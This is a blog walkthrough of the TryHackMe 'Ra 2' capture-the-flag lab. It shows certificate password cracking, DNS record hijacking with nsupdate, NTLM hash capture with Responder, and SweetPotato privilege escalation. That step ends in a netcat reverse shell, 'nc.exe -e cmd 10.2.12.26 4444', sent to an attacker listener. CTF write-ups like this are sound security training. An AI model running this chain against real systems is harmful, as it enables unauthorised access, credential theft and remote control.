::: {}
# Ra 2 TryHackme Walkthrough {#ra-2-tryhackme-walkthrough .p-name}
:::

::: {.section .p-summary field="subtitle"}
Room link: https://tryhackme.com/room/ra2 Note: This room is for Premium
Members Only. who purchased THM premium membership.
:::

::::::: {.section .e-content field="body"}
:::::: {#8b1d .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Ra 2 TryHackme Walkthrough {#13a9 .graf .graf--h3 .graf--leading .graf--title name="13a9"}

<figure id="9e92" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*-WRKvfWvOQk1O31a.png"
class="graf-image" data-image-id="0*-WRKvfWvOQk1O31a.png"
data-width="428" data-height="228" />
</figure>

**Room link:**
[https://tryhackme.com/room/ra2](https://tryhackme.com/room/ra2){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/ra2"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is for Premium Members Only. who purchased THM premium
membership.**

Difficulty: Hard\
Room: [Ra2](https://tryhackme.com/room/ra2){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/ra2"
rel="noopener ugc nofollow noopener" target="_blank"}\
Created by: [4ndr34zz](https://tryhackme.com/p/4ndr34zz){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/p/4ndr34zz"
rel="noopener ugc nofollow noopener" target="_blank"} and
[theart42](https://tryhackme.com/p/theart42){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/p/theart42"
rel="noopener ugc nofollow noopener" target="_blank"}

Have you complete [**Ra
1**](https://tryhackme.com/room/ra){.markup--anchor .markup--p-anchor
data-href="https://tryhackme.com/room/ra"
rel="noopener ugc nofollow noopener" target="_blank"} room

### Enumeration {#ab53 .graf .graf--h3 .graf-after--p name="ab53"}

If you want to use nmap i suggest

``` {#d76a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
nmap -p- -T4 -sC -sV -Pn -vvv 10.10.202.59
```

This process can be take long time scan maybe 30 minutes or 45

Lets visit 10.10.202.59 in browser and it reveal
[http://fire.windcorp.thm/](https://fire.windcorp.thm/){.markup--anchor
.markup--p-anchor data-href="https://fire.windcorp.thm/"
rel="noopener ugc nofollow noopener" target="_blank"}

**Hostname**

fire.windcorp.thm

add to /etc/hosts file

``` {#97d2 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
echo 10.10.202.59    fire.windcorp.thm >>/etc/hosts
```

<figure id="ab73" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*U2tJx8XAg9GTvefi.png"
class="graf-image" data-image-id="0*U2tJx8XAg9GTvefi.png"
data-width="875" data-height="367" />
</figure>

Here i doubt this domain has more DNS so i check Certificate

<figure id="3ea5" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*x-8yRCmtHU8Ts7Ip.png"
class="graf-image" data-image-id="0*x-8yRCmtHU8Ts7Ip.png"
data-width="595" data-height="580" />
</figure>

i found Two more DNS

selfservice.windcorp.thm

selfservice.dev.windcorp.thm

Add to /etc/hosts

Dig Tool reveals our first flag

<figure id="b3b1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*xbD92ROPJxpaouvA.png"
class="graf-image" data-image-id="0*xbD92ROPJxpaouvA.png"
data-width="875" data-height="394" />
</figure>

``` {#3e92 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gobuster dir -u https://fire.windcorp.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

<figure id="53fb" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*H1elto32-Xdn2R2p.png"
class="graf-image" data-image-id="0*H1elto32-Xdn2R2p.png"
data-width="875" data-height="389" />
</figure>

Visit
[https://fire.windcorp.thm/powershell](https://fire.windcorp.thm/){.markup--anchor
.markup--p-anchor data-href="https://fire.windcorp.thm/"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="78e6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*eHw_w7RN4Eed7FPY.png"
class="graf-image" data-image-id="0*eHw_w7RN4Eed7FPY.png"
data-width="753" data-height="547" />
</figure>

But we don't have Credential

``` {#f2bb .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gobuster dir -u https://selfservice.dev.windcorp.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

<figure id="f91a" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*N7JDVhHCXCHkpNVn.png"
class="graf-image" data-image-id="0*N7JDVhHCXCHkpNVn.png"
data-width="875" data-height="304" />
</figure>

we found backup folder

<figure id="7dcb" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*4BWG44zEfLWO2GIM.png"
class="graf-image" data-image-id="0*4BWG44zEfLWO2GIM.png"
data-width="723" data-height="268" />
</figure>

download these files and check the content of file

<figure id="a1e8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*nQRurEu-HFo8N9qh.png"
class="graf-image" data-image-id="0*nQRurEu-HFo8N9qh.png"
data-width="440" data-height="122" />
</figure>

cert.pfx is password protected .Try t crack the password

### Crackpkcs12 Tool {#1ca0 .graf .graf--h3 .graf-after--p name="1ca0"}

crackpkcs12 is a tool to audit PKCS#12 files passwords (extension .p12
or .pfx). It's written in C and uses openssl library. It works on
GNU/Linux and other UNIX systems. His author is aestu and his license is
GPLv3+ slightly modified to use openssl library

Windows servers use .pfx files that contain a public key file and the
associated private key file. Let's use crackpkcs12.

You can download it
[here](http://sourceforge.net/projects/crackpkcs12/files/){.markup--anchor
.markup--p-anchor
data-href="http://sourceforge.net/projects/crackpkcs12/files/"
rel="noopener ugc nofollow noopener" target="_blank"}.

``` {#128f .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
tar -xf crackpkcs12*
cd crackpkcs12*
./configure
make
sudo make install
```

A simple dictionary attack:

> *crackpkcs12 -d rockyou.txt certificate.pfx*

<figure id="ab5d" class="graf graf--figure graf-after--blockquote">
<img
src="https://cdn-images-1.medium.com/max/800/0*z5iicnkHATFBoUZT.png"
class="graf-image" data-image-id="0*z5iicnkHATFBoUZT.png"
data-width="612" data-height="207" />
</figure>

Generate Private key

``` {#048e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="csharp"}
openssl pkcs12 -in cert.pfx -nocerts -out private.pem -nodes
```

Generate Public key

``` {#45c9 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="csharp"}
openssl pkcs12 -in cert.pfx -out public.pem -clcerts -nokeys
```

<figure id="cdbf" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*3TUIkyeVR3VuhKca.png"
class="graf-image" data-image-id="0*3TUIkyeVR3VuhKca.png"
data-width="699" data-height="221" />
</figure>

### nsupdate {#23ec .graf .graf--h3 .graf-after--figure name="23ec"}

Since we know we can update DNS records without our machine being joined
to the domain we'll use nsupdate. Let's send a request to delete the
existing A record for selfservice.windcorp.thm and then send an update
add request for a new A record to have selfservice resolve to our THM
IP.

``` {#3121 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="markdown"}
🚀 nsupdate
> server 10.10.168.132
> update delete selfservice.windcorp.thm
> send
> update add selfservice.windcorp.thm 1234 A 10.2.12.26
> send
> quit
```

<figure id="8e80" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*z9lrqUm2xjYc8FzB.png"
class="graf-image" data-image-id="0*z9lrqUm2xjYc8FzB.png"
data-width="605" data-height="241" />
</figure>

### Let's Try dig Tool {#008b .graf .graf--h3 .graf-after--figure name="008b"}

Let's query the DNS server to see if selfservice.windcorp.thm will now
resolve to our THM IP when a client requests a lookup.

``` {#72a0 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
dig selfservice.windcorp.thm @10.10.168.132
```

<figure id="70e3" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*bQhJiud4zHD0F-ce.png"
class="graf-image" data-image-id="0*bQhJiud4zHD0F-ce.png"
data-width="767" data-height="452" />
</figure>

### Responder {#fb2a .graf .graf--h3 .graf-after--figure name="fb2a"}

Before you start responder you'll want to copy the two certs generated
earlier to /usr/share/responder/certs or wherever /certs lives on your
machine.

<figure id="6733" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*5QXjuo1yAAL8spIs.png"
class="graf-image" data-image-id="0*5QXjuo1yAAL8spIs.png"
data-width="600" data-height="72" />
</figure>

We'll want to edit responder's config for the HTTPS server.

Then edit /etc/responder/Responder.conf

<figure id="3ece" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*GyxuBb28DpQnI8vY.png"
class="graf-image" data-image-id="0*GyxuBb28DpQnI8vY.png"
data-width="418" data-height="183" />
</figure>

Fire up responder to listen on tun0

<figure id="54d4" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*hgsrFnNmRapiLLWH.png"
class="graf-image" data-image-id="0*hgsrFnNmRapiLLWH.png"
data-width="586" data-height="565" />
</figure>

Now visit this URL

``` {#addc .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
https://selfservice.dev.windcorp.thm/backup/
```

We capture a request.

<figure id="694b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*7cLglbhiVerreHhC.png"
class="graf-image" data-image-id="0*7cLglbhiVerreHhC.png"
data-width="795" data-height="350" />
</figure>

save this hash into file and Crack this hash

<figure id="dad8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*NXgSZE64O21nDTPN.png"
class="graf-image" data-image-id="0*NXgSZE64O21nDTPN.png"
data-width="801" data-height="267" />
</figure>

So we have credential

As the server is not running SSH, but there is an alternative, WinRM on
port 5985. WinRM is used for PowerShell remoting, where an authenticated
user can access the server and submit commands. Using the evil-winrm
tool, we can access the server semi-interactively.

Now login here
[https://fire.windcorp.thm/powershell](https://fire.windcorp.thm/powershell){.markup--anchor
.markup--p-anchor data-href="https://fire.windcorp.thm/powershell"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="f311" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*nT31TcSzjNbNgjN-.png"
class="graf-image" data-image-id="0*nT31TcSzjNbNgjN-.png"
data-width="501" data-height="403" />
</figure>

<figure id="3450" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*D6BO5eutZr7VsYRe.png"
class="graf-image" data-image-id="0*D6BO5eutZr7VsYRe.png"
data-width="875" data-height="577" />
</figure>

<figure id="57f7" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*z2tLWnKjcNXDblRR.png"
class="graf-image" data-image-id="0*z2tLWnKjcNXDblRR.png"
data-width="577" data-height="298" />
</figure>

<figure id="3d73" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*DBET6E8a3-z6UidV.png"
class="graf-image" data-image-id="0*DBET6E8a3-z6UidV.png"
data-width="659" data-height="255" />
</figure>

This makes us think of SweetPotato.

<figure id="7e7a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*0kvWWbk5cRyzmMjr.png"
class="graf-image" data-image-id="0*0kvWWbk5cRyzmMjr.png"
data-width="591" data-height="285" />
</figure>

Now start

``` {#cdda .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
rlwrap nc -lvp 4444
```

<figure id="aa7b" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Jz-GeVdx5rdaDuDw.png"
class="graf-image" data-image-id="0*Jz-GeVdx5rdaDuDw.png"
data-width="729" data-height="256" />
</figure>

``` {#ef23 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
.\SweetPotato.exe -p nc.exe -a "-e cmd 10.2.12.26 4444"
```

<figure id="ed9e" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*TPh8RzA094Je-uvu.png"
class="graf-image" data-image-id="0*TPh8RzA094Je-uvu.png"
data-width="740" data-height="202" />
</figure>

<figure id="e557" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*PtLX--2kYZB7CS_U.png"
class="graf-image" data-image-id="0*PtLX--2kYZB7CS_U.png"
data-width="573" data-height="313" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#7eb6 .graf .graf--h3 .graf-after--figure name="7eb6"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#51de .graf .graf--h3 .graf-after--p name="51de"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [September 2, 2024](https://medium.com/p/e16d826ac6ae).

[Canonical
link](https://medium.com/@bevijaygupta/ra-2-tryhackme-walkthrough-e16d826ac6ae){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
